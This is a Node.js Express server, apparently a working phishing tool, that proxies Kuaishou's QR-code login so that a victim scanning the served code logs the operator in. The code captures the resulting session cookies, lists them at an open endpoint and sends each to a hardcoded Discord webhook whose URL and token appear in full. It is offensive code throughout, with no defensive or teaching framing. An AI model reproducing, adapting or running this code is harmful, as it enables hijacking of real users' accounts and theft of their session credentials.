const express = require("express");
const https = require("https");
const { v4: uuidv4 } = require("uuid");
const path = require("path");
const app = express();

app.use(express.json());
app.use(express.static(__dirname));

const WEBHOOK_URL = "https://discord.com/api/webhooks/1494697274121650310/DAbxLzXxdk4EWHyZpeJwVKydfQdQEyul4lOnjE8HAvNouZuwAQP8Sd8w_dLsrxYV6zG1";

const scans = {};
const cookies = [];
const logs = [];

function ksRequest(method, path, body, extraHeaders) {
    return new Promise(function(resolve, reject) {
        var headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        };
        if (extraHeaders) {
            Object.keys(extraHeaders).forEach(function(k) {
                headers[k] = extraHeaders[k];
            });
        }

        var options = {
            hostname: "id.kuaishou.com",
            path: path,
            method: method,
            headers: headers
        };

        var req = https.request(options, function(res) {
            var bodyStr = "";
            var respCookies = res.headers["set-cookie"] || [];
            res.on("data", function(chunk) { bodyStr += chunk; });
            res.on("end", function() {
                resolve({
                    status: res.statusCode,
                    headers: res.headers,
                    cookies: respCookies,
                    body: bodyStr
                });
            });
        });

        req.on("error", function(e) {
            logs.push("请求错误: " + path + " " + e.message);
            reject(e);
        });

        if (body) {
            req.write(JSON.stringify(body));
        }
        req.end();
    });
}

// ====== 首页 ======
app.get("/", function(req, res) {
    res.sendFile(path.join(__dirname, "scan.html"));
});

app.get("/cookies", function(req, res) {
    res.sendFile(path.join(__dirname, "cookies.html"));
});

// ====== 生成二维码 ======
app.get("/api/qr", function(req, res) {
    var scanId = uuidv4();

    ksRequest("POST", "/rest/c/infra/ks/qr/start", {
        source: "web",
        bizType: "login"
    }).then(function(result) {
        logs.push("qr/start 返回: " + result.body.substring(0, 500));
        
        try {
            var data = JSON.parse(result.body);
            
            // 尝试多种可能的返回格式
            var qrCode = "";
            var qrToken = "";

            if (data.data) {
                qrCode = data.data.qrCode || data.data.imageData || data.data.qrCodeUrl || "";
                qrToken = data.data.qrToken || data.data.token || data.data.loginToken || "";
            }
            if (!qrCode && data.qrCode) qrCode = data.qrCode;
            if (!qrToken && data.qrToken) qrToken = data.qrToken;
            if (!qrToken && result.headers["x-auth-token"]) qrToken = result.headers["x-auth-token"];

            // 也检查set-cookie里的token
            if (!qrToken) {
                result.cookies.forEach(function(c) {
                    if (c.indexOf("qrToken=") !== -1) {
                        qrToken = c.split("qrToken=")[1].split(";")[0];
                    }
                    if (c.indexOf("token=") !== -1) {
                        qrToken = qrToken || c.split("token=")[1].split(";")[0];
                    }
                });
            }

            if (!qrCode) {
                logs.push("解析失败，完整响应: " + result.body);
                return res.json({ error: "二维码获取失败", log: result.body.substring(0, 200) });
            }

            scans[scanId] = {
                status: "wait",
                cookie: null,
                qrToken: qrToken,
                qrCode: qrCode,
                cookies: result.cookies,
                createdAt: Date.now()
            };

            logs.push("成功: qrCode长度=" + qrCode.length + " qrToken=" + qrToken.substring(0, 20));

            res.json({
                scanId: scanId,
                qrCode: qrCode,
                qrToken: qrToken
            });
        } catch(e) {
            logs.push("JSON解析错误: " + e.message + " body: " + result.body.substring(0, 300));
            res.json({ error: "解析失败" });
        }
    }).catch(function(e) {
        logs.push("请求失败: " + e.message);
        res.status(500).json({ error: "请求失败" });
    });
});

// ====== 检查状态 ======
app.get("/api/check", function(req, res) {
    var id = req.query.id;
    var scan = scans[id];

    if (!scan) {
        return res.json({ status: "expired" });
    }

    if (scan.status === "done") {
        return res.json({ status: "done", cookie: scan.cookie });
    }

    var checkBody = {};
    if (scan.qrToken) {
        checkBody.qrToken = scan.qrToken;
    }
    checkBody.source = "web";

    ksRequest("POST", "/rest/c/infra/ks/qr/checkResult", checkBody).then(function(result) {
        logs.push("checkResult: " + result.body.substring(0, 300));

        try {
            var data = JSON.parse(result.body);
            var status = data.status || (data.data && data.data.status) || 0;

            if (status === 2 || data.result === 1) {
                // 已确认登录，获取回调地址
                scan.cookie = result.cookies.map(function(c) {
                    return c.split(";")[0];
                }).join("; ");

                // 合并之前步骤的cookie
                var allCookies = scan.cookies.concat(result.cookies);
                scan.cookie = allCookies.map(function(c) {
                    return c.split(";")[0];
                }).join("; ");

                scan.status = "done";
                cookies.push({
                    cookie: scan.cookie,
                    time: new Date().toISOString()
                });

                sendToDiscord(scan.cookie);

                res.json({ status: "done", cookie: scan.cookie });
            } else if (status === 1 || data.data.status === 1) {
                res.json({ status: "scanned" });
            } else {
                res.json({ status: "wait" });
            }
        } catch(e) {
            res.json({ status: "wait" });
        }
    }).catch(function() {
        res.json({ status: "wait" });
    });
});

// ====== Cookie列表 ======
app.get("/api/cookies", function(req, res) {
    res.json(cookies.slice(-50).reverse());
});

// ====== 日志 ======
app.get("/api/logs", function(req, res) {
    res.json(logs.slice(-30));
});

// ====== 发送Discord ======
function sendToDiscord(cookie) {
    var data = JSON.stringify({
        content: "**新Cookie**\n```\n" + cookie + "\n```"
    });

    var url = new URL(WEBHOOK_URL);
    var req = https.request({
        hostname: url.hostname,
        path: url.pathname + url.search,
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(data)
        }
    });
    req.write(data);
    req.end();
}

var PORT = process.env.PORT || 3000;
app.listen(PORT, function() {
    console.log("端口 " + PORT);
});